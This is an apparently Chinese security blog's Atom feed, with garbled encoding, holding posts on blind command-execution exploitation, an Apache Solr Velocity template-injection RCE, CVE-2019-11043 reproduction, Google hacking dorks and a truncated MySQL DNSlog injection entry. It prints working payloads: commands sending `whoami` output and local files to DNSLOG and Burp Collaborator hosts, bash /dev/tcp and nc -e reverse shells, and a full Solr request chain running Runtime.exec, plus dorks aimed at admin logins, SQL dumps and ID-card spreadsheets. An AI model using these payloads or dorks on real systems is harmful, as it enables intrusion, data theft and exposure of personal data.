<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>VK&#39;s blog</title>
  
  <subtitle>VK&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.vkxss.top/"/>
  <updated>2019-11-08T08:44:04.377Z</updated>
  <id>http://www.vkxss.top/</id>
  
  <author>
    <name>VK</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æ— å›æ˜¾ä»£ç æ‰§è¡Œåˆ©ç”¨æ–¹æ³•æ€»ç»“</title>
    <link href="http://www.vkxss.top/2019/11/08/%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://www.vkxss.top/2019/11/08/æ— å›æ˜¾ä»£ç æ‰§è¡Œåˆ©ç”¨æ–¹æ³•æ€»ç»“/</id>
    <published>2019-11-08T07:30:08.000Z</published>
    <updated>2019-11-08T08:44:04.377Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-dnslogå›æ˜¾">0X00 DNSLOGå›æ˜¾</a></li><li><a href="#0x01-curlä¸Šä¼ æ–‡ä»¶">0X01 curlä¸Šä¼ æ–‡ä»¶</a></li><li><a href="#0x02-åå¼¹shell">0X02 åå¼¹shell</a></li></ul><!-- tocstop --><h2><span id="0x00-dnslogå›æ˜¾">0X00 DNSLOGå›æ˜¾</span></h2><ul><li><p>å°è¯•DNSLOGè·å–å›æ˜¾<br>ä½¿ç”¨åå¼•å·æ‰§è¡Œä»£ç ï¼Œå¹¶ç”¨curlå°†æ‰§è¡Œç»“æœè¿”å›ç»™DNSLOG</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://dnslog/`whoami`</span><br><span class="line">ping `whoami`.dnslog</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://imgchr.com/i/MZp6f0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZp6f0.jpg" alt="MZp6f0.jpg"></a><br><a href="https://imgchr.com/i/MZpDTs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZpDTs.jpg" alt="MZpDTs.jpg"></a></p><h2><span id="0x01-curlä¸Šä¼ æ–‡ä»¶">0X01 curlä¸Šä¼ æ–‡ä»¶</span></h2><ul><li><p>æˆ‘ä»¬å¯ä»¥ç”¨ -X POST æ¥ç”³æ˜æˆ‘ä»¬çš„è¯·æ±‚æ–¹æ³•ï¼Œç”¨ -F â€œfile=@<strong>FILE_PATH</strong>â€œ çš„è¯·ç¤ºï¼Œä¼ è¾“æ–‡ä»¶å³å¯ã€‚</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># åˆ©ç”¨Burpï¼š</span><br><span class="line">curl -X POST -F xx=@/Users/vk/Downloads/1.txt http://a8jmrauzh2kxy56bhk99xwhh78dy1n.burpcollaborator.net -v</span><br><span class="line"></span><br><span class="line"># åˆ©ç”¨NCï¼š</span><br><span class="line">curl -X POST -F xx=@/Users/vk/Downloads/1.txt http://127.0.0.1:9999 -v</span><br></pre></td></tr></table></figure></li><li><p>æ‰“å¼€Burpä¸»ç•Œé¢ â€“&gt;èœå•ï¼ˆBurpï¼‰â€“&gt;Burp Collaboraor Client â€“ &gt; ç‚¹å‡» Copy to Clipboard<br><a href="https://imgchr.com/i/MZp2lT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZp2lT.jpg" alt="MZp2lT.jpg"></a><br><a href="https://imgchr.com/i/MZpR6U" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZpR6U.jpg" alt="MZpR6U.jpg"></a></p></li></ul><h2><span id="0x02-åå¼¹shell">0X02 åå¼¹shell</span></h2><ul><li><p>ç”¨ncè¿”å›ä¸€ä¸ªäº¤äº’å¼çš„shell</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># æœåŠ¡å™¨ç«¯æ‰§è¡Œ</span><br><span class="line">nc -vv -lp 8888</span><br><span class="line"></span><br><span class="line"># å‘½ä»¤æ‰§è¡Œå¤„æ‰§è¡Œ</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"># payload</span><br><span class="line">command=111%0d%0abash+-i+&gt;%26+/dev/tcp/127.0.0.1/8888+0&gt;%261</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://imgchr.com/i/MZpyYq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZpyYq.jpg" alt="MZpyYq.jpg"></a><br><a href="https://imgchr.com/i/MZpskn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZpskn.jpg" alt="MZpskn.jpg"></a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-dnslogå›æ˜¾&quot;&gt;0X00 DNSLOGå›æ˜¾&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-curlä¸Šä¼ æ–‡ä»¶&quot;&gt;0X01 curlä¸Šä¼ æ–‡ä»¶&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x0
      
    
    </summary>
    
    
      <category term="WEBå®‰å…¨" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEBæ¸—é€æµ‹è¯•" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Apache_Solr_Velocityæ¨¡æ¿æ³¨å…¥RCEæ¼æ´</title>
    <link href="http://www.vkxss.top/2019/10/31/Apache_Solr_Velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5RCE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.vkxss.top/2019/10/31/Apache_Solr_Velocityæ¨¡æ¿æ³¨å…¥RCEæ¼æ´/</id>
    <published>2019-10-31T07:30:08.000Z</published>
    <updated>2019-11-01T03:31:26.517Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-å‰è¨€">0x00 å‰è¨€</a></li><li><a href="#0x01-æ¼æ´è¯¦æƒ…">0x01 æ¼æ´è¯¦æƒ…</a></li><li><a href="#0x02-poc">0x02 POC</a></li><li><a href="#0x03-å¤ç°">0x03 å¤ç°</a></li></ul><!-- tocstop --><h2><span id="0x00-å‰è¨€">0x00 å‰è¨€</span></h2><ul><li><p>Solræ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ä¼ä¸šçº§æœç´¢åº”ç”¨æœåŠ¡å™¨ï¼Œå®ƒå¯¹å¤–æä¾›ç±»ä¼¼äºWeb-serviceçš„APIæ¥å£ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡httpè¯·æ±‚ï¼Œå‘æœç´¢å¼•æ“æœåŠ¡å™¨æäº¤ä¸€å®šæ ¼å¼çš„XMLæ–‡ä»¶ï¼Œç”Ÿæˆç´¢å¼•ï¼›ä¹Ÿå¯ä»¥é€šè¿‡Http Getæ“ä½œæå‡ºæŸ¥æ‰¾è¯·æ±‚ï¼Œå¹¶å¾—åˆ°XMLæ ¼å¼çš„è¿”å›ç»“æœã€‚</p></li><li><p>ræ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ä¼ä¸šçº§æœç´¢åº”ç”¨æœåŠ¡å™¨ï¼Œå®ƒå¯¹å¤–æä¾›ç±»ä¼¼äºWeb-serviceçš„APIæ¥å£ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡httpè¯·æ±‚ï¼Œå‘æœç´¢å¼•æ“æœåŠ¡å™¨æäº¤ä¸€å®šæ ¼å¼çš„XMLæ–‡ä»¶ï¼Œç”Ÿæˆç´¢å¼•ï¼›ä¹Ÿå¯ä»¥é€šè¿‡Http Getæ“ä½œæå‡ºæŸ¥æ‰¾è¯·æ±‚ï¼Œå¹¶å¾—åˆ°XMLæ ¼å¼çš„è¿”å›ç»“æœã€‚</p></li></ul><h2><span id="0x01-æ¼æ´è¯¦æƒ…">0x01 æ¼æ´è¯¦æƒ…</span></h2><ul><li>è¯¥æ¼æ´çš„äº§ç”ŸåŸå› ï¼š<ul><li>1ã€æ”»å‡»è€…å¯ä»¥ç›´æ¥è®¿é—®solr adminé¡µé¢,å¹¶å¯ä»¥é€šè¿‡æ„é€ postè¯·æ±‚æ¥ä¿®æ”¹èŠ‚ç‚¹çš„é…ç½®.</li><li>2.Apache Solré»˜è®¤é›†æˆVelocityResponseWriteræ’ä»¶ï¼Œåœ¨è¯¥æ’ä»¶çš„åˆå§‹åŒ–å‚æ•°ä¸­çš„params.resource.loader.enabledè¿™ä¸ªé€‰é¡¹æ˜¯ç”¨æ¥æ§åˆ¶æ˜¯å¦å…è®¸å‚æ•°èµ„æºåŠ è½½å™¨åœ¨Solrè¯·æ±‚å‚æ•°ä¸­æŒ‡å®šæ¨¡ç‰ˆï¼Œé»˜è®¤è®¾ç½®æ˜¯falseã€‚</li><li>3ã€å½“params.resource.loader.enabledè®¾ç½®ä¸ºtrueï¼Œå°†å…è®¸ç”¨æˆ·é€šè¿‡è®¾ç½®è¯·æ±‚ä¸­çš„å‚æ•°æ¥æŒ‡å®šç›¸å…³èµ„æºçš„åŠ è½½ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ä¸€ä¸ªæ¶æ„çš„è¯·æ±‚ï¼Œåœ¨æœåŠ¡å™¨ä¸Šè¿›è¡Œå‘½ä»¤æ‰§è¡Œ,ä»è€Œè·å–æœåŠ¡å™¨çš„æƒé™ã€‚</li></ul></li></ul><h2><span id="0x02-poc">0x02 POC</span></h2><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">æ¥è‡ªï¼šhttps://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt </span><br><span class="line"></span><br><span class="line">Apache Solr RCE via Velocity template</span><br><span class="line"></span><br><span class="line">Set &quot;params.resource.loader.enabled&quot; as true.</span><br><span class="line"></span><br><span class="line">Request:</span><br><span class="line">========================================================================</span><br><span class="line">POST /solr/test/config HTTP/1.1</span><br><span class="line">Host: solr:8983</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RCE via velocity template</span><br><span class="line">Request:</span><br><span class="line">========================================================================</span><br><span class="line">GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1</span><br><span class="line">Host: localhost:8983</span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Response:</span><br><span class="line">========================================================================</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Content-Length: 56</span><br><span class="line"></span><br><span class="line">     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)</span><br><span class="line">========================================================================</span><br></pre></td></tr></table></figure></code></pre><h2><span id="0x03-å¤ç°">0x03 å¤ç°</span></h2><ul><li><p>ç¯å¢ƒæ­å»º</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¸‹è½½æœ€æ–°çš„Solr</span><br><span class="line">ä¸‹è½½åœ°å€:https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.zip</span><br><span class="line">è§£å‹ä»¥å,è¿›å…¥solr-8.2.0/binç›®å½•</span><br><span class="line">ä½¿ç”¨./solr -e dih -forceå¼€å¯ç¤ºä¾‹app</span><br></pre></td></tr></table></figure><p> <a href="https://imgchr.com/i/K7nKL4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/01/K7nKL4.md.jpg" alt="K7nKL4.md.jpg"></a></p></li><li><p>payload:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br><span class="line">æ³¨æ„ï¼šæ¼æ´éœ€è¦Content-Typeä¸ºapplication/json</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/K7nuyF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/01/K7nuyF.md.jpg" alt="K7nuyF.md.jpg"></a></p></li><li><p>åå¼¹shellï¼š</p><ul><li>å¯ä»¥åå¼¹shellï¼Œä½¿ç”¨ncå‘½ä»¤ï¼š<br><a href="https://imgchr.com/i/K7nnQU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/01/K7nnQU.md.jpg" alt="K7nnQU.md.jpg"></a></li></ul><ul><li>nc -e /bin/bash ip portæˆåŠŸåå¼¹shell<br><a href="https://imgchr.com/i/K7nezT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/01/K7nezT.md.jpg" alt="K7nezT.md.jpg"></a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot;&gt;0x00 å‰è¨€&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-æ¼æ´è¯¦æƒ…&quot;&gt;0x01 æ¼æ´è¯¦æƒ…&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-poc&quot;&gt;0x02 POC&lt;/a&gt;&lt;
      
    
    </summary>
    
    
      <category term="WEBå®‰å…¨" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEBæ¸—é€æµ‹è¯•" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-11043-PHPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°</title>
    <link href="http://www.vkxss.top/2019/10/25/CVE-2019-11043/"/>
    <id>http://www.vkxss.top/2019/10/25/CVE-2019-11043/</id>
    <published>2019-10-25T07:30:08.000Z</published>
    <updated>2019-11-01T05:22:25.327Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-ç®€ä»‹">0X00 ç®€ä»‹</a></li><li><a href="#0x01-cveç¼–å·">0X01 CVEç¼–å·</a></li><li><a href="#0x02-æ¼æ´å¨èƒç­‰çº§">0X02 æ¼æ´å¨èƒç­‰çº§</a></li><li><a href="#0x03-å½±å“èŒƒå›´">0X03 å½±å“èŒƒå›´</a></li><li><a href="#0x04-æ¼æ´å¤ç°">0X04 æ¼æ´å¤ç°</a></li><li><a href="#0x05-æ¼æ´æ€»ç»“">0X05 æ¼æ´æ€»ç»“</a></li><li><a href="#0x06-reference">0X06 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-ç®€ä»‹">0X00 ç®€ä»‹</span></h2><ul><li>9 æœˆ 26 æ—¥ï¼Œå®‰å…¨ç ”ç©¶å‘˜ Andrew Danauå‘PHP æäº¤ä¸€æšè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œä½¿ç”¨æŸäº›ç‰¹å®šé…ç½®çš„Nginx + PHP-FPM çš„æœåŠ¡å™¨å­˜åœ¨æ¼æ´ï¼Œå¯å…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»£ç ã€‚è¯¥æ¼æ´EXPäº10æœˆ22æ—¥å…¬å¼€ã€‚<br>åŸå› æ˜¯ï¼šNginx ä¸Š fastcgi_split_path_info åœ¨å¤„ç†å¸¦æœ‰ %0a çš„è¯·æ±‚æ—¶ï¼Œä¼šå› ä¸ºé‡åˆ°æ¢è¡Œç¬¦ \n å¯¼è‡´ PATH_INFO ä¸ºç©ºã€‚è€Œ php-fpm åœ¨å¤„ç† PATH_INFO ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œå­˜åœ¨é€»è¾‘ç¼ºé™·ã€‚æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒçš„æ„é€ å’Œåˆ©ç”¨ï¼Œå¯ä»¥å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</li></ul><h2><span id="0x01-cveç¼–å·">0X01 CVEç¼–å·</span></h2><ul><li>CVE-2019-11043</li></ul><h2><span id="0x02-æ¼æ´å¨èƒç­‰çº§">0X02 æ¼æ´å¨èƒç­‰çº§</span></h2><ul><li>é«˜å±</li></ul><h2><span id="0x03-å½±å“èŒƒå›´">0X03 å½±å“èŒƒå›´</span></h2><ul><li><p>Nginx+ php-fpm çš„æœåŠ¡å™¨ï¼Œåœ¨ä½¿ç”¨å¦‚ä¸‹é…ç½®çš„æƒ…å†µä¸‹ï¼Œéƒ½å¯èƒ½å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line">        fastcgi_split_path_info^(.+?\.php)(/.*)$;</span><br><span class="line">        fastcgi_param PATH_INFO       $fastcgi_path_info;</span><br><span class="line">        fastcgi_pass   php:9000;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2><span id="0x04-æ¼æ´å¤ç°">0X04 æ¼æ´å¤ç°</span></h2><ul><li><p>åœ¨EXPå…¬å¸ƒçš„æ—¶å€™ï¼Œvulhubä¹Ÿå‘å¸ƒäº†ç›¸åº”çš„é•œåƒï¼Œæœ¬æ¬¡å®éªŒä½¿ç”¨è¯¥é•œåƒè¿›è¡Œå¤ç°ã€‚</p><ul><li><a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043</a></li></ul></li><li><p>å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ä¹‹åï¼Œæ­å»ºç¯å¢ƒ:</p><ul><li>docker-compose up -d</li></ul></li><li><p>Nginx + php-fpm çš„æœåŠ¡å™¨ï¼Œåœ¨ä½¿ç”¨å¦‚ä¸‹é…ç½®çš„æƒ…å†µä¸‹ï¼Œéƒ½å¯èƒ½å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚<br><img src="https://s2.ax1x.com/2019/11/01/K7rsNn.jpg" alt="K7rsNn.jpg"></p></li><li><p>è¯¦æƒ…å‚è€ƒReference</p></li></ul><h2><span id="0x05-æ¼æ´æ€»ç»“">0X05 æ¼æ´æ€»ç»“</span></h2><ul><li>åˆ©ç”¨æ¡ä»¶è‹›åˆ»ï¼Œå› ä¸ºè§¦å‘æ¼æ´çš„é…ç½®ä¸æ˜¯é»˜è®¤é…ç½®ã€‚</li><li>å³ä½¿æ˜¯è§¦å‘æ¼æ´çš„é…ç½®ï¼Œä»æœ‰å¤±è´¥çš„æœºç‡ï¼Œæ‰§è¡Œå‘½ä»¤æ—¶æˆåŠŸç‡50%çš„æ ·å­ã€‚</li></ul><h2><span id="0x06-reference">0X06 Reference</span></h2><ul><li>å‚è€ƒé“¾æ¥ï¼š<a href="https://github.com/vkbiu/CVE/tree/master/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/vkbiu/CVE/tree/master/CVE-2019-11043</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-ç®€ä»‹&quot;&gt;0X00 ç®€ä»‹&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-cveç¼–å·&quot;&gt;0X01 CVEç¼–å·&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-æ¼æ´å¨èƒç­‰çº§&quot;&gt;0X02 æ¼æ´å¨
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="CVE-2019-16759" scheme="http://www.vkxss.top/tags/CVE-2019-16759/"/>
    
  </entry>
  
  <entry>
    <title>google_hackè¯­æ³•</title>
    <link href="http://www.vkxss.top/2019/10/24/google_hack%E8%AF%AD%E6%B3%95/"/>
    <id>http://www.vkxss.top/2019/10/24/google_hackè¯­æ³•/</id>
    <published>2019-10-24T04:25:40.000Z</published>
    <updated>2019-10-24T14:22:41.970Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="google-hackè¯­æ³•">google hackè¯­æ³•</span></h2><hr><p><b>ç®€ä»‹</b><br>åœ¨æ—¥ç«™çš„æ—¶å€™googleæœç´¢èƒ½è®©æˆ‘ä»¬è·å¾—æ„æƒ³ä¸åˆ°çš„ä¿¡æ¯ï¼Œå¯ä»¥æ‰¾åˆ°ç›®æ ‡ç«™ç‚¹çš„æ•æ„Ÿä¿¡æ¯ã€‚åå°ç­‰ç­‰</p><hr><p><b>google hackè¯­æ³•åˆ—è¡¨</b><br>åˆçº§è¯­æ³•è¡¨</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ¨¡ç³Šæœç´¢-ä¾‹å¦‚ï¼šå¢æœ¬ä¼Ÿ</span><br><span class="line">ç²¾ç¡®æœç´¢-ä¾‹å¦‚ï¼š<span class="string">"å¢æœ¬ä¼Ÿ"</span></span><br><span class="line">é€šé…ç¬¦*-ä¾‹å¦‚ï¼šä½•å®‰åœ»*</span><br><span class="line">é€šé…ç¬¦.-ä¾‹å¦‚ï¼šå¤§å²­å±±ä¸­å­¦.   PS:.çš„é€šé…ç¬¦ç”¨äºåŒ¹é…å­—ç¬¦</span><br><span class="line">å¸ƒå°”é€»è¾‘-ä¾‹å¦‚ï¼šå¤§å²­å±±ä¸­å­¦ and ä½•å®‰åœ»</span><br><span class="line">é€»è¾‘æˆ–|-ä¾‹å¦‚ï¼šç»¿ç›Ÿ (éƒ‘å·)</span><br><span class="line">é€»è¾‘é-ä¾‹å¦‚ï¼šä½•å®‰åœ» -åšå®¢å›­</span><br><span class="line">çº¦æŸæ¡ä»¶-ä¾‹å¦‚ï¼šé»é¢–å¸Œ +è·å¥–</span><br><span class="line">æ•°å­—èŒƒå›´-ä¾‹å¦‚ï¼šç»¿ç›Ÿ+<span class="number">2009</span>å¹´ <span class="number">2015</span>å¹´</span><br></pre></td></tr></table></figure><p>é«˜çº§è¯­æ³•è¡¨</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è®¿é—®åŸºæœ¬ä¿¡æ¯-ä¾‹å¦‚ï¼šinfo:baidu.com</span><br><span class="line">æ ‡é¢˜æœç´¢-ä¾‹å¦‚ï¼šintitle:åå°ç™»å½•</span><br><span class="line">æ­£æ–‡æœç´¢-ä¾‹å¦‚ï¼šintext:èº«ä»½è¯å¤§å…¨</span><br><span class="line">urlæœç´¢-ä¾‹å¦‚ï¼šinurl:google.com</span><br><span class="line">é”šé“¾é“¾æ¥æœç´¢-ä¾‹å¦‚ï¼šinanchor:google</span><br><span class="line">æ–‡æ¡£ç±»å‹é™å®šæœç´¢-ä¾‹å¦‚ï¼šintext:èº«ä»½è¯å¤§å…¨ filetype:xls</span><br><span class="line">ç¼“å­˜æœç´¢-lä¾‹å¦‚ï¼šcache:secqun.org</span><br><span class="line">ç›¸å…³ç½‘å€æœç´¢-ä¾‹å¦‚ï¼šrelated:google hacking</span><br><span class="line">ç›¸å…³è¿æ¥æœç´¢-ä¾‹å¦‚ï¼šlink:baidu.com</span><br><span class="line">ä¸æŒ‡å®šåŸŸåç›¸å…³çš„æœç´¢ï¼šsite:baidu.com</span><br></pre></td></tr></table></figure><p>é«˜çº§åˆ©ç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">inurl:robots.txt</span><br><span class="line">intitle:ç™»å½• intext:username inurl:login.jsp</span><br><span class="line">inurl:<span class="number">8080</span> inurl:jsp</span><br><span class="line">filetype:sql site:com <span class="keyword">and</span> <span class="string">"insert into admin 2014"</span></span><br><span class="line">inurl:jsp/demo.jsp</span><br><span class="line">inurl:update <span class="built_in">set</span> inurl:where</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;google-hackè¯­æ³•&quot;&gt;google hackè¯­æ³•&lt;/span&gt;&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;&lt;b&gt;ç®€ä»‹&lt;/b&gt;&lt;br&gt;åœ¨æ—¥ç«™çš„æ—¶å€™googleæœç´¢èƒ½è®©æˆ‘ä»¬è·å¾—æ„æƒ³ä¸åˆ°çš„ä¿¡æ¯ï¼Œå¯ä»¥æ‰¾åˆ°ç›®æ ‡ç«™ç‚¹çš„æ•æ„Ÿä¿¡æ¯ã€‚åå°ç­‰ç­‰&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;b&gt;goo
      
    
    </summary>
    
    
      <category term="WEBå®‰å…¨" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEBæ¸—é€æµ‹è¯•" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Mysql-Dnslogç›²æ³¨</title>
    <link href="http://www.vkxss.top/2019/10/21/Mysql-Dnslog%E7%9B%B2%E6%B3%A8/"/>
    <id>http://www.vkxss.top/2019/10/21/Mysql-Dnslogç›²æ³¨/</id>
    <published>2019-10-21T06:25:40.000Z</published>
    <updated>2019-10-21T17:01:56.359Z</updated>
    
